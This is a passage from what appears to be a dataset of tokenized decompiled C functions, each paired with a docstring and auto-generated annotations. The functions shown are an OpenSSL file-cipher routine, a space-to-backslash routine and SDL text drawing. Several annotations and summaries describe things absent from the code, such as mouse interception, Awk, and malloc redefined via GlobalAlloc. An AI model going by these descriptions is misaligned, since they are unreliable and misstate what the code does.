            ")",
            "{",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207DC0",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "out",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "out",
            ")",
            ";",
            "out",
            "=",
            "pa",
            "-",
            ">",
            "out",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207E20",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "IV",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "IV",
            ")",
            ";",
            "IV",
            "=",
            "pa",
            "-",
            ">",
            "IV",
            ";",
            "if",
            "(",
            "!",
            "IV",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_208780",
            ")",
            ";",
            "if",
            "(",
            "!",
            "out",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_2087E0",
            ")",
            ";",
            "fwrite",
            "(",
            "IV",
            ",",
            "1uL",
            "L",
            ",",
            "0x10uL",
            "L",
            ",",
            "out",
            ")",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207E80",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "plaintext",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "plaintext",
            ")",
            ";",
            "plaintext",
            "=",
            "pa",
            "-",
            ">",
            "plaintext",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207EE0",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "IV",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "IV",
            ")",
            ";",
            "fread",
            "(",
            "pa",
            "-",
            ">",
            "IV",
            ",",
            "1uL",
            "L",
            ",",
            "0x10uL",
            "L",
            ",",
            "plaintext",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207F40",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ")",
            ";",
            "}",
            "v12",
            "=",
            "pa",
            "-",
            ">",
            "encrypt",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207FA0",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "IV",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "IV",
            ")",
            ";",
            "v13",
            "=",
            "pa",
            "-",
            ">",
            "IV",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_208000",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "key",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "key",
            ")",
            ";",
            "EVP_CipherInit_ex",
            "(",
            "ctx",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "pa",
            "-",
            ">",
            "key",
            ",",
            "v13",
            ",",
            "v12",
            ")",
            ";",
            "while",
            "(",
            "num_bytes_read",
            ">",
            "1023",
            ")",
            "{",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_208060",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "plaintext",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "plaintext",
            ")",
            ";",
            "num_bytes_read",
            "=",
            "fread",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "96",
            ")",
            ",",
            "1uL",
            "L",
            ",",
            "0x400uL",
            "L",
            ",",
            "pa",
            "-",
            ">",
            "plaintext",
            ")",
            ";",
            "EVP_CipherUpdate",
            "(",
            "ctx",
            ",",
            "p_out_buf",
            ",",
            "v2",
            "+",
            "32",
            ",",
            "v2",
            "+",
            "96",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "num_bytes_read",
            ")",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2080C0",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "out",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "out",
            ")",
            ";",
            "v14",
            "=",
            "pa",
            "-",
            ">",
            "out",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "n",
            "=",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "v15",
            "=",
            "p_out_buf",
            ";",
            "if",
            "(",
            "!",
            "p_out_buf",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_208840",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v14",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_2088A0",
            ")",
            ";",
            "fwrite",
            "(",
            "v15",
            ",",
            "1uL",
            "L",
            ",",
            "n",
            ",",
            "v14",
            ")",
            ";",
            "}",
            "EVP_CipherFinal_ex",
            "(",
            "ctx",
            ",",
            "p_out_buf",
            ",",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_208120",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "out",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "out",
            ")",
            ";",
            "v16",
            "=",
            "pa",
            "-",
            ">",
            "out",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "v17",
            "=",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "v18",
            "=",
            "p_out_buf",
            ";",
            "if",
            "(",
            "!",
            "p_out_buf",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_208900",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v16",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_208960",
            ")",
            ";",
            "fwrite",
            "(",
            "v18",
            ",",
            "1uL",
            "L",
            ",",
            "v17",
            ",",
            "v16",
            ")",
            ";",
            "EVP_CIPHER_CTX_reset",
            "(",
            "ctx",
            ")",
            ";",
            "free",
            "(",
            "ctx",
            ")",
            ";",
            "if",
            "(",
            "v22",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v2",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8088",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "v4",
            "+",
            "536862722",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v4",
            "+",
            "2147450880",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v4",
            "+",
            "2147450888",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "144",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1172321806L",
            "L",
            ";",
            "__asan_stack_free_5",
            "(",
            "v2",
            ",",
            "1152L",
            "L",
            ",",
            "v22",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"stack\" appears to define data structures related to stacks, possibly for different purposes such as managing execution environments, runtime stack for JavaScript functions, or a stack for binary search tree nodes, each tailored to specific needs within a program or system.",
            "The `malloc` function allocates memory dynamically on the heap, commonly used for allocating memory for variables and data structures, facilitating dynamic memory management in C programs."
        ],
        "longer_label": "The provided code defines a cipher function in C that dynamically allocates memory, initializes a cipher context, performs encryption or decryption on input data using EVP functions, and writes the result to an output file, while managing memory and handling potential errors."
    },
    {
        "id": 194,
        "docstring_tokens": [
            "The",
            "code",
            "replaces",
            "all",
            "spaces",
            "in",
            "the",
            "input",
            "string",
            "with",
            "backslashes",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "name",
            ")",
            "{",
            "int",
            "v1",
            ";",
            "const",
            "char",
            "*",
            "v2",
            ";",
            "char",
            "*",
            "v3",
            ";",
            "unsigned",
            "__int64",
            "v4",
            ";",
            "char",
            "*",
            "p",
            ";",
            "if",
            "(",
            "!",
            "name",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_2089C0",
            ")",
            ";",
            "p",
            "=",
            "strchr",
            "(",
            "name",
            ",",
            "32",
            ")",
            ";",
            "while",
            "(",
            "p",
            ")",
            "{",
            "v1",
            "=",
            "(",
            "_DWORD",
            ")",
            "name",
            "-",
            "(",
            "_DWORD",
            ")",
            "p",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "name",
            ",",
            "p",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_208260",
            ",",
            "name",
            ",",
            "p",
            ")",
            ";",
            "v2",
            "=",
            "&",
            "name",
            "[",
            "v1",
            "]",
            ";",
            "v3",
            "=",
            "&",
            "name",
            "[",
            "v1",
            "+",
            "1",
            "]",
            ";",
            "if",
            "(",
            "!",
            "v3",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_208A20",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v2",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_208A80",
            ")",
            ";",
            "strcpy",
            "(",
            "v3",
            ",",
            "v2",
            ")",
            ";",
            "v4",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "name",
            "[",
            "(",
            "int",
            ")",
            "name",
            "-",
            "(",
            "int",
            ")",
            "p",
            "]",
            ";",
            "if",
            "(",
            "!",
            "v4",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_208200",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v4",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "v4",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v4",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_store1",
            "(",
            "v4",
            ")",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v4",
            "=",
            "92",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `ubsan_handle` is likely part of a system for handling undefined behavior sanitizer (UBSan) violations, providing mechanisms to handle various types of overflow, type mismatches, and other undefined behavior detections in a kernel or low-level code, potentially facilitating error reporting or mitigation strategies.",
            "The function `sub_overflow` is used to determine if an arithmetic subtraction operation between two unsigned 64-bit integers will result in an overflow, by checking the sign bit of the result in relation to the operands' most significant bits.",
            "The `handle` function appears to be a part of a larger codebase, possibly related to input device interception or error handling, with structs defining mouse input data and interception device arrays, and includes error code definitions and comments on UTF-8 mechanisms for use within an Awk implementation.",
            "The function \"nonnull\" returns the first argument if it's not null, otherwise, it returns the second argument, providing a convenient way to handle null pointer cases.",
            "The function strcpy is used to copy a string from one location to another in memory.",
            "The `mismatch` function is likely intended to handle error cases where there's a discrepancy or inconsistency, such as bracket mismatches in brainfuck code, initialization discrepancies in machine endianness or file data, or mismatches in RPC versions or system calls.",
            "The `report` function is likely intended for generating reports or logging debugging information related to garbage collection statistics and memory management in a C program, possibly utilizing macros like `gc_report` to control verbosity levels and format output."
        ],
        "longer_label": "The provided code appears to be a C function designed to prepare a string by removing spaces and adding escape characters, with annotations suggesting it may be part of a system handling undefined behavior sanitizer violations in a low-level context such as a kernel, potentially involving input device interception or error handling mechanisms."
    },
    {
        "id": 195,
        "docstring_tokens": [
            "This",
            "code",
            "draws",
            "text",
            "options",
            "on",
            "a",
            "SDL",
            "renderer",
            "using",
            "a",
            "specified",
            "font",
            "and",
            "parameters",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "SDL_Renderer_0",
            "*",
            "rend",
            ",",
            "TTF_Font",
            "*",
            "Font",
            ",",
            "int",
            "x",
            ",",
            "int",
            "y",
            ",",
            "int",
            "w",
            ",",
            "int",
            "h",
            ",",
            "char",
            "*",
            "text",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v7",
            ";",
            "__int64",
            "v8",
            ";",
            "_DWORD",
            "*",
            "v9",
            ";",
            "SDL_Surface_0",
            "*",
            "surfaceMessage",
            ";",
            "SDL_Texture_0",
            "*",
            "Message",
            ";",
            "char",
            "v16",
            "[",
            "152",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v17",
            ";",
            "v7",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v16",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v8",
            "=",
            "__asan_stack_malloc_1",
            "(",
            "128L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v8",
            ")",
            "v7",
            "=",
            "v8",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v7",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "8",
            ")",
            "=",
            "\"2 32 4 5 White 96 16 12 Message_rect \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "16",
            ")",
            "=",
            "drawOptions",
            ";",
            "v9",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v7",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v9",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v9",
            "[",
            "536862721",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v9",
            "[",
            "536862722",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v9",
            "[",
            "536862723",
            "]",
            "=",
            "-",
            "219021312",
            ";",
            "v17",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "32",
            ")",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "32",
            ")",
            "=",
            "-",
            "1",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "33",
            ")",
            "=",
            "-",
            "1",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "34",
            ")",
            "=",
            "-",
            "1",
            ";",
            "surfaceMessage",
            "=",
            "(",
            "SDL_Surface_0",
            "*",
            ")",
            "TTF_RenderText_Solid",
            "(",
            "Font",
            ",",
            "text",
            ",",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "32",
            ")",
            ")",
            ";",
            "Message",
            "=",
            "(",
            "SDL_Texture_0",
            "*",
            ")",
            "SDL_CreateTextureFromSurface",
            "(",
            "rend",
            ",",
            "surfaceMessage",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v7",
            "+",
            "96",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "96",
            ")",
            "=",
            "x",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "100",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "100",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "100",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v7",
            "+",
            "100",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "100",
            ")",
            "=",
            "y",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "104",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "104",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v7",
            "+",
            "104",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "104",
            ")",
            "=",
            "w",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "108",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "108",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v7",
            "+",
            "108",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v7",
            "+",
            "108",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "108",
            ")",
            "=",
            "h",
            ";",
            "SDL_RenderCopy",
            "(",
            "rend",
            ",",
            "Message",
            ",",
            "0L",
            "L",
            ",",
            "v7",
            "+",
            "96",
            ")",
            ";",
            "SDL_FreeSurface",
            "(",
            "surfaceMessage",
            ")",
            ";",
            "SDL_DestroyTexture",
            "(",
            "Message",
            ")",
            ";",
            "if",
            "(",
            "v16",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v7",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v7",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v7",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v7",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v7",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v7",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"stack\" function likely operates within a programming context where it manages various types of stacks, potentially including memory allocation, function execution environments, and binary search tree nodes, facilitating operations such as push, pop, and traversal.",
            "The function `malloc` is a memory allocation function commonly used in C programming to dynamically allocate memory on the heap, but in this provided code snippet, it's redefined to use Windows API `GlobalAlloc` for memory allocation instead.",
            "The function \"qword\" likely deals with manipulating or processing 64-bit (quad-word) data types, possibly for tasks such as bitwise operations, arithmetic calculations, or memory management in low-level programming contexts."
        ],
        "longer_label": "The provided code is a function that likely operates within a low-level programming context, utilizing stack management and memory allocation, including redefining the `malloc` function to use Windows API `GlobalAlloc`, and dealing with 64-bit data types."
    },
    {
        "id": 196,
        "docstring_tokens": [
            "The",
            "code",
            "draws",
            "a",
            "title",
            "with",
            "the",
            "specified",
            "text",
            "using",
            "a",
            "given",
            "font",
            "and",
            "renderer",
            "at",
            "the",
            "specified",
            "coordinates",
            "and",
            "dimensions",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "SDL_Renderer_0",
            "*",
            "rend",
            ",",
            "TTF_Font",
            "*",
            "Font",
            ",",
            "int",
            "x",
            ",",
            "int",
            "y",
            ",",
            "int",
            "w",
            ",",
            "int",
            "h",
            ",",
            "char",
            "*",
            "text",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v7",
            ";",
            "__int64",
            "v8",
            ";",
            "_DWORD",
            "*",
            "v9",
            ";",
            "SDL_Surface_0",
            "*",
            "surfaceMessage",
            ";",
            "SDL_Texture_0",
            "*",
            "Message",
            ";",
            "char",
            "v16",
            "[",
            "152",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v17",
            ";",
            "v7",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v16",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v8",
            "=",
            "__asan_stack_malloc_1",
            "(",
            "128L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v8",
            ")",
            "v7",
            "=",
            "v8",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v7",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "8",
            ")",
            "=",
            "\"2 32 4 5 White 96 16 12 Message_rect \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "16",
            ")",
            "=",
            "drawTitle",
            ";",
            "v9",
            "=",
            "(",
            "_DWORD",
